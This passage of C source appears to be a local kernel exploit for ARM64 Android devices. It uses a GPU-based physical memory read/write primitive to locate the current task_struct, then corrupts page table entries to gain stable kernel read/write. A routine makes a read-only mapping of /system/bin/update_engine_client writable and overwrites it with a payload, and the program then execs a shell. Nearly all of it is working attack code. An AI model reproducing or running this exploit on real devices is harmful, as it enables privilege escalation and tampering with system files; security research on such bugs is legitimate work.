            // PID is 32-bit, so mask to get just the PID
            uint32_t pid = (uint32_t)(pid_64 & 0xFFFFFFFF);

            // Skip tasks with PID 0 after init (they're kernel threads)
            if (count > 0 && pid == 0) {
                fprintf(stderr, "Skipping kernel thread at phys: 0x%lx\n", current_task_phys);
            } else {
                fprintf(stderr, "Found task PID: %u at phys: 0x%lx\n", pid, current_task_phys);

                if (pid == (uint32_t)getpid()) {
                    fprintf(stderr, "*** Found current process (PID %u) task_struct at physical address: 0x%lx ***\n", pid, current_task_phys);
                    return current_task_phys;
                }
            }
        } else {
            fprintf(stderr, "Could not read PID for task at 0x%lx\n", current_task_phys);
        }

        // Read prev task pointer (this is a kernel VA)
        uint64_t prev_ptr_phys = current_tasks_member_phys + 8; // tasks.prev offset
        uint64_t list_entry_va = 0;
        fprintf(stderr, "get_curr_task_struct: Reading prev task pointer from: 0x%lx\n", prev_ptr_phys);
        if (ReadPhys64(cheese, prev_ptr_phys, &list_entry_va)) {
            fprintf(stderr, "Error reading prev task pointer\n");
            break;
        }

        fprintf(stderr, "Prev task VA in list: 0x%lx\n", list_entry_va);

        // Skip null or invalid pointers
        if (list_entry_va == 0) {
            fprintf(stderr, "Warning: Got null VA, list may be corrupted\n");
            break;
        }

        // Check if this looks like a kernel address
        if ((list_entry_va & 0xffffff0000000000ULL) != 0xffffff0000000000ULL) {
            fprintf(stderr, "Warning: VA 0x%lx doesn't look like a kernel address\n", list_entry_va);
            break;
        }

        // Use kernel_va_to_pa for the first conversion to establish the offset
        uint64_t list_entry_pa;
        if (!kernel_offset_calculated) {
            fprintf(stderr, "Using kernel_va_to_pa for first conversion to establish offset\n");
            list_entry_pa = kernel_va_to_pa(cheese, list_entry_va);
            if (!list_entry_pa) {
                fprintf(stderr, "Failed to convert first VA 0x%lx to PA using page tables\n", list_entry_va);
                break;
            }
            fprintf(stderr, "First conversion: VA 0x%lx -> PA 0x%lx\n", list_entry_va, list_entry_pa);

            // Calculate offset: PA = VA + offset, so offset = PA - VA
            // Use signed arithmetic to handle the subtraction properly
            kernel_offset = (int64_t)list_entry_pa - (int64_t)list_entry_va;
            kernel_offset_calculated = true;
            fprintf(stderr, "Calculated kernel offset: 0x%lx\n", (uint64_t)kernel_offset);
        } else {
            // Use the calculated offset for subsequent conversions
            list_entry_pa = (uint64_t)((int64_t)list_entry_va + kernel_offset);
            fprintf(stderr, "Converted VA 0x%lx to PA 0x%lx using offset\n", list_entry_va, list_entry_pa);
        }
        
        current_tasks_member_phys = list_entry_pa;
        count++;
    } while (current_tasks_member_phys != init_task_tasks_phys && count < 1000);

    fprintf(stderr, "get_curr_task_struct: Failed to find current task after %d iterations\n", count);
    return 0;
}

static jmp_buf env_jmp_buf;

#include <stdarg.h>

// New functions to match the user's snippet
void log_info(const char* format, ...) {
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    fprintf(stderr, "\n");
    va_end(args);
}

uint64_t kernel_vread_u64(struct cheese_gpu_rw* ctx, uint64_t kva) {
    uint64_t pa = kernel_va_to_pa(ctx, kva);
    if (!pa) {
        log_info("kernel_vread_u64: failed to convert VA %#lx to PA", kva);
        return 0;
    }
    return kernel_pread_u64(ctx, pa);
}

void kernel_write_u64(struct cheese_gpu_rw* ctx, uint64_t paddr, uint64_t val, bool ignored) {
    kernel_pwrite_u64(ctx, paddr, val);
}

uint64_t get_pgd_offset(uint64_t addr) {
    return ((addr >> 30) & 0x1FF) * sizeof(uint64_t);
}

uint64_t get_pmd_offset(uint64_t addr) {
    return ((addr >> 21) & 0x1FF) * sizeof(uint64_t);
}

uint64_t get_pte_offset(uint64_t addr) {
    return ((addr >> 12) & 0x1FF) * sizeof(uint64_t);
}

void flush_tlb() {
    __asm__ volatile(
        "dsb ishst\n"
        "tlbi vmalle1is\n"
        "dsb ish\n"
        "isb\n"
        : : : "memory"
    );
}

uint64_t phys_to_readwrite_pte(uint64_t pa) {
    uint64_t page_pa = pa & ~0xFFFULL;
    const uint64_t PA_FIELD_MASK = 0x0000FFFFFFFFF000ULL;
    uint64_t new_pte = (page_pa & PA_FIELD_MASK);
    new_pte |= 0x3;
    new_pte &= ~(1ULL << 7);
    new_pte |= (1ULL << 6);
    new_pte |= (1ULL << 10);
    return new_pte;
}


static int dirty_flag_exploit(struct cheese_gpu_rw* ctx, uint64_t tsk) {
    log_info("\n\n--- Starting Dirty Flag Exploit on /system/bin/update_engine_client ---");

    const char* target_file = "/system/bin/update_engine_client";
    int target_fd = open(target_file, O_RDONLY);
    if (target_fd < 0) {
        log_info("Failed to open target file %s: %s", target_file, strerror(errno));
        return 1;
    }
    log_info("Opened %s", target_file);

    // Read the smiley patch
    int smiley_fd = open("smiley", O_RDONLY);
    if (smiley_fd < 0) {
        log_info("Failed to open smiley file: %s", strerror(errno));
        close(target_fd);
        return 1;
    }

    char patch_buffer[PAGE_SIZE];
    ssize_t patch_size = read(smiley_fd, patch_buffer, sizeof(patch_buffer));
    close(smiley_fd);

    if (patch_size <= 0) {
        log_info("Failed to read smiley file or file is empty. read returned %zd, errno: %s", patch_size, strerror(errno));
        close(target_fd);
        return 1;
    }
    log_info("Read %zd bytes from smiley file", patch_size);


    // Map the file read-only. Use MAP_SHARED to ensure changes are written back.
    char* file_map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, target_fd, 0);
    if (file_map == MAP_FAILED) {
        log_info("Failed to mmap target file: %s", strerror(errno));
        close(target_fd);
        return 1;
    }
    log_info("Mapped %s at %p", target_file, file_map);

    // Fault in the page by reading it
    volatile char first_byte = file_map[0];
    log_info("Faulted in page, first byte: 0x%02x", (unsigned char)first_byte);

    // Force TLB flush and ensure page is fully mapped
    msync(file_map, PAGE_SIZE, MS_SYNC);
    usleep(100000);

    // We need the PGD of the current process to walk its page tables
    if (!tsk) {
        log_info("Failed to get current task_struct for dirty flag exploit");
        goto cleanup_map;
    }
    uint64_t mm_va = kernel_pread_u64(ctx, tsk + OFFSETOF_TASK_STRUCT_MM);
    uint64_t mm_pa = kernel_va_to_pa(ctx, mm_va);
    uint64_t pgd_field_pa = mm_pa + OFFSETOF_MM_PGD;
    uint64_t mm_pgd_va = kernel_pread_u64(ctx, pgd_field_pa);
    uint64_t mm_pgd_pa = kernel_va_to_pa(ctx, mm_pgd_va);

    if (!mm_pgd_pa) {
        log_info("Failed to get PGD for current process");
        goto cleanup_map;
    }
    log_info("Got current process PGD physical address: %#lx", mm_pgd_pa);

    // Walk page tables to find the PTE of our mapped file
    uint64_t pte_paddr = walk_page_table_for_pte(ctx, mm_pgd_pa, (uint64_t)file_map);
    if (!pte_paddr) {
        log_info("Failed to find PTE for mapped file at %p", file_map);
        goto cleanup_map;
    }
    log_info("Found PTE for %s at physical address %#lx", target_file, pte_paddr);

    // Read the original PTE
    uint64_t original_pte = kernel_pread_u64(ctx, pte_paddr);
    log_info("Original PTE value: %#lx", original_pte);

    // Create a new writable PTE
    // Set R/W by clearing AP[2] (bit 7) and setting AP[1] (bit 6)
    // Also set Access Flag (AF, bit 10)
    uint64_t writable_pte = original_pte;
    writable_pte &= ~(1ULL << 7); // Clear AP[2] to allow user write
    writable_pte |= (1ULL << 6);  // Set AP[1]
    writable_pte |= (1ULL << 10); // Set AF (Access Flag)

    log_info("New writable PTE value: %#lx", writable_pte);

    // Write the new PTE using our kernel write primitive
    log_info("Writing new PTE to physical address %#lx", pte_paddr);
    kernel_pwrite_u64(ctx, pte_paddr, writable_pte);
    sleep(1);

    // Verify the write
    uint64_t pte_after_write = kernel_pread_u64(ctx, pte_paddr);
    log_info("PTE value after write: %#lx", pte_after_write);
    if (pte_after_write != writable_pte) {
        log_info("ERROR: Failed to write new PTE value!");
        goto cleanup_map;
    }
    log_info("✓ PTE successfully made writable.");

    // Now, write to the read-only mapping. This should succeed and mark the page dirty.
    log_info("Attempting to write to read-only mapping at %p", file_map);
    
    // Overwrite with smiley content
    memcpy(file_map, patch_buffer, patch_size);
    log_info("Wrote %zd bytes from smiley to the start of the mapped file.", patch_size);

    // The CPU should have set the dirty bit in the PTE now.
    // On ARM64, this is the DBM bit (Dirty Bit Modifier, bit 51).
    uint64_t pte_after_dirty = kernel_pread_u64(ctx, pte_paddr);
    log_info("PTE value after writing to memory: %#lx", pte_after_dirty);

    if (pte_after_dirty & (1ULL << 51)) {
        log_info("✓ DBM (Dirty) bit is set in PTE!");
    } else if (pte_after_dirty != pte_after_write) {
        log_info("✓ PTE changed after write, dirty status likely updated by hardware/kernel.");
    } else {
        log_info("PTE did not change after write. The kernel might handle dirty bit differently or write-back is not guaranteed.");
    }

    // Unmap the file. The kernel's VFS layer should see the dirty page and attempt to write it back.
    log_info("Unmapping the file. Kernel will attempt to write the changes back to disk.");
    munmap(file_map, PAGE_SIZE);
    close(target_fd);

    log_info("--- Dirty Flag Exploit Finished ---");
    log_info("Even if the underlying filesystem is read-only, the page was successfully marked dirty in memory.");
    log_info("Check 'dmesg' or logcat for potential write errors from the kernel trying to write to a read-only partition.");

    return 0;

cleanup_map:
    munmap(file_map, PAGE_SIZE);
    close(target_fd);
    return 1;
}

static int stabilize_rw(struct cheese_gpu_rw* cheese, uint64_t tsk) {
    struct cheese_gpu_rw* ctx = cheese;
    
    // Get task_struct PHYSICAL address
    if (!tsk) {
        log_info("Failed to get current task_struct");
        return 1;
    }
    log_info("Current task_struct physical address: %#lx", tsk);
    
    // Map a 2MB region, which is likely to be 2MB-aligned. This ensures
    // that the two pages we use from it will not cross a PMD boundary.
    // It also increases the chance of getting physically contiguous pages.
    uint64_t *map = mmap(NULL, 0x200000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map == MAP_FAILED) {
        log_info("mmap of 2MB failed: %s", strerror(errno));
        return 1;
    }
    // We only need two pages, so unmap the rest of the 2MB region.
    munmap((char*)map + PAGE_SIZE * 2, 0x200000 - (PAGE_SIZE * 2));
    
    uint64_t *page_map = (void *)((uint64_t)map + PAGE_SIZE);
    
    // Touch both pages
    map[0] = 0x4141414141414141;
    page_map[0] = 0x4242424242424242;
    
    log_info("Mapped pages at %p and %p", map, page_map);
    
    // Read mm_struct VA from task_struct (tsk is physical address)
    uint64_t mm_va = kernel_pread_u64(ctx, tsk + OFFSETOF_TASK_STRUCT_MM);
    log_info("mm_struct (kernel VA) = %#lx", mm_va);
    
    if (!mm_va) {
        log_info("mm_struct VA is NULL");
        return 1;
    }
    
    // Convert mm VA to PA using page table walk
    log_info("Using page table walk to convert mm VA to PA");
    uint64_t mm_pa = kernel_va_to_pa(ctx, mm_va);
    
    if (!mm_pa) {
        log_info("Failed to convert mm VA %#lx to PA", mm_va);
        return 1;
    }
    
    log_info("mm_struct PA = %#lx", mm_pa);
    
    // Read pgd field from mm_struct
    uint64_t pgd_field_pa = mm_pa + OFFSETOF_MM_PGD;
    log_info("Reading pgd from PA %#lx", pgd_field_pa);
    
    uint64_t mm_pgd_va = kernel_pread_u64(ctx, pgd_field_pa);
    log_info("mm_pgd (kernel VA) = %#lx", mm_pgd_va);
    
    if (!mm_pgd_va || (mm_pgd_va & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
        log_info("Invalid pgd VA: %#lx", mm_pgd_va);
        return 1;
    }
    
    // Convert pgd VA to PA
    log_info("Converting pgd VA to PA");
    uint64_t mm_pgd_pa = kernel_va_to_pa(ctx, mm_pgd_va);
    
    if (!mm_pgd_pa) {
        log_info("Failed to convert pgd VA to PA");
        return 1;
    }
    
    log_info("mm_pgd PA = %#lx", mm_pgd_pa);
    
    // Now walk the page table for our userspace mapping
    uint64_t pgd_offset = get_pgd_offset((uint64_t)map);
    log_info("PGD offset for map address %p: %#lx", map, pgd_offset);
    
    uint64_t pgd_entry = kernel_pread_u64(ctx, mm_pgd_pa + pgd_offset);
    log_info("PGD entry = %#lx", pgd_entry);
    
    if ((pgd_entry & 0x3) != 0x3) {
        log_info("Invalid PGD entry");
        return 1;
    }
    
    uint64_t phys_pmd_addr = pgd_entry & 0x0000FFFFFFFFF000ULL;
    uint64_t pmd_offset = get_pmd_offset((uint64_t)map);
    uint64_t pmd_entry = kernel_pread_u64(ctx, phys_pmd_addr + pmd_offset);
    log_info("PMD entry = %#lx", pmd_entry);
    
    if ((pmd_entry & 0x1) == 0 || (pmd_entry & 0x3) == 0x1) {
        log_info("Invalid or block PMD entry");
        return 1;
    }
    
    uint64_t phys_pte_addr = pmd_entry & 0x0000FFFFFFFFF000ULL;
    uint64_t pte_offset_a = get_pte_offset((uint64_t)map);
    uint64_t pte_addr_a = phys_pte_addr + pte_offset_a;
    uint64_t pte_addr_b = pte_addr_a + 8;
    
    log_info("PTE addr A: %#lx, PTE addr B: %#lx", pte_addr_a, pte_addr_b);
    log_info("PTE table physical address: %#lx", phys_pte_addr);
    
    uint64_t pte_a = kernel_pread_u64(ctx, pte_addr_a);
    uint64_t pte_b = kernel_pread_u64(ctx, pte_addr_b);
    
    log_info("Checking PTEs for both pages:");
    log_info("PTE A = %#lx, PTE B = %#lx", pte_a, pte_b);
    
    if (pte_a == 0 || pte_b == 0) {
        log_info("ERROR: PTE is 0");
        return 1;
    }
    
    // Extract physical addresses from PTEs for verification
    uint64_t pa_from_pte_a = pte_a & 0x0000FFFFFFFFF000ULL;
    uint64_t pa_from_pte_b = pte_b & 0x0000FFFFFFFFF000ULL;
    log_info("Physical address from PTE A: %#lx", pa_from_pte_a);
    log_info("Physical address from PTE B: %#lx", pa_from_pte_b);
    
    // The exploit requires that the PTEs for both pages are in the same PTE table.
    // This is true if the virtual addresses don't cross a 2MB boundary.
    uint64_t map_pte_region = (uint64_t)map & ~0x1FFFFFULL;
    uint64_t page_map_pte_region = (uint64_t)page_map & ~0x1FFFFFULL;

    if (map_pte_region != page_map_pte_region) {
        log_info("ERROR: The mapped pages cross a 2MB boundary, placing them in different PTE tables. Aborting.");
        return 1;
    } else {
        log_info("yes both are in same pagetable (PTE)");
    }

    // For diagnostic purposes, log whether the underlying physical pages are consecutive.
    if ((pa_from_pte_b - pa_from_pte_a) != 0x1000) {
        log_info("WARNING: Physical pages are not consecutive. Difference: %#lx.", pa_from_pte_b - pa_from_pte_a);
    } else {
        log_info("INFO: Physical pages are consecutive.");
    }
    
    // Corrupt PTE B to point to the PTE table
    uint64_t new_pte_b = pte_b;
    
    // Clear the physical address field [47:12]
    new_pte_b &= ~0x0000FFFFFFFFF000ULL;
    
    // Set new physical address (the PTE table address)
    uint64_t pte_table_pa = phys_pte_addr & ~0xFFFULL;
    new_pte_b |= (pte_table_pa & 0x0000FFFFFFFFF000ULL);
    
    // Make it writable - clear AP[2] (bit 7), set AP[1] (bit 6)
    new_pte_b &= ~(1ULL << 7);
    new_pte_b |= (1ULL << 6);
    
    // Also ensure AF (Access Flag) is set
    new_pte_b |= (1ULL << 10);
    
    log_info("Original PTE B: %#lx", pte_b);
    log_info("New PTE B:      %#lx", new_pte_b);
    log_info("  Physical addr field: %#lx -> %#lx", 
             pte_b & 0x0000FFFFFFFFF000ULL, 
             new_pte_b & 0x0000FFFFFFFFF000ULL);
    log_info("  AP bits [7:6]: %#lx -> %#lx",
             (pte_b >> 6) & 0x3,
             (new_pte_b >> 6) & 0x3);
    
    // Verify the new PTE looks valid before writing
    if ((new_pte_b & 0x3) != 0x3) {
        log_info("ERROR: New PTE is not a valid page descriptor!");
        return 1;
    }
    
    log_info("About to write new PTE to %#lx", pte_addr_b);
    log_info("This will make page_map (at %p) point to the PTE table", page_map);
    
    // Use the setup_pagetables + DoWrite approach for safer write
    if (setup_pagetables(ctx->target_physical_page, 1, ctx->phyaddr, 
                        kFakeGpuAddr, pte_addr_b & ~0xfffull)) {
        log_info("setup_pagetables failed");
        return 1;
    }
    sync_cache_to_gpu(ctx->target_physical_page, ctx->target_physical_page + 0x1000);
    
    uint32_t values[2];
    values[0] = new_pte_b & 0xFFFFFFFF;
    values[1] = (new_pte_b >> 32) & 0xFFFFFFFF;
    
    log_info("Writing PTE as two dwords: %#x %#x", values[0], values[1]);
    
    if (DoWrite(ctx->fd, ctx->ctx_id, ctx->payload_buf, ctx->payload_gpuaddr,
                ctx->phyaddr, kFakeGpuAddr + 0x1100, true,
                kFakeGpuAddr + (pte_addr_b & 0xfffull), 2, values)) {
        log_info("DoWrite failed");
        return 1;
    }
    
    log_info("Write submitted, waiting for completion...");
    sleep(1);
    
    sync_cache_from_gpu(ctx->target_physical_page, ctx->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = ctx->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        log_info("Write completion marker not set: %#x", result_marker[0]);
        return 1;
    }

    uint64_t read_back_pte;
    if (ReadPhys64(ctx, pte_addr_b, &read_back_pte)) {
        log_info("Failed to read back PTE from %#lx", pte_addr_b);
    } else {
        log_info("Read back PTE from %#lx: %#lx", pte_addr_b, read_back_pte);
    }

    fprintf(stderr, "pte wait 5 second show countdown\n");
    for (int i = 5; i > 0; i--) {
        fprintf(stderr, "%d ", i);
        sleep(1);
    }
    fprintf(stderr, "\n");
    
    log_info("Write completed successfully");

    // Clear marker
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));

    ctx->garbage = map;
    return 0;
}

// ------------------- End of stabilization code -------------------

static void maybe_retry(char** argv) {
    char* attempt = getenv("CHEESE_ATTEMPT");
    int attempt_num = attempt? atoi(attempt): 0;
    int new_attempt = attempt_num + 1;
    if (new_attempt < sizeof(gPhyAddrs) / sizeof(*gPhyAddrs)) {
        char new_attempt_str[10];
        snprintf(new_attempt_str, sizeof(new_attempt_str), "%d", new_attempt);
        setenv("CHEESE_ATTEMPT", new_attempt_str, true);
        execv("/proc/self/exe", argv);
    }
}

int main(int argc, char** argv) {
    g_level1_dcache_size = tu_get_l1_dcache_size();
    fprintf(stderr, "Current process PID: %d\n", getpid());
    if (!getenv("CHEESE_SKIP_GPU")) {
        struct cheese_gpu_rw cheese = {};
        cheese.fd = 0;
        cheese.ctx_id = 0;
        cheese.payload_buf = NULL;
        cheese.payload_gpuaddr = 0;
        cheese.output_buf = NULL;
        cheese.output_gpuaddr = 0;
        cheese.target_physical_page = NULL;
        cheese.phyaddr = 0;
        cheese.garbage = NULL;
        cheese.swapper_pg_dir_phys = 0;
        cheese.init_task_phys = 0;
        
        if (cheese_gpu_rw_setup(&cheese)) {
            fprintf(stderr, "can't get GPU r/w\n");
            if (!getenv("CHEESE_NO_RETRY")) {
                maybe_retry(argv);
            }
            return 1;
        }

        uint64_t tsk = get_curr_task_struct(&cheese);
        if (!tsk) {
            fprintf(stderr, "Failed to get current task_struct\n");
            if (!getenv("CHEESE_NO_RETRY")) {
                maybe_retry(argv);
            }
            return 1;
        }

        if (stabilize_rw(&cheese, tsk)) {
            fprintf(stderr, "Failed to stabilize r/w\n");
            if (!getenv("CHEESE_NO_RETRY")) {
                maybe_retry(argv);
            }
            return 1;
        }

        // After stabilizing kernel R/W, run the dirty flag exploit
        dirty_flag_exploit(&cheese, tsk);
    }

    char* const just_sh[] = {"sh", NULL};
    char* const* new_argv = argc > 1? argv + 1: just_sh;

    execvp(new_argv[0], new_argv);
    fprintf(stderr, "can't exec?\n");

    return 0;
}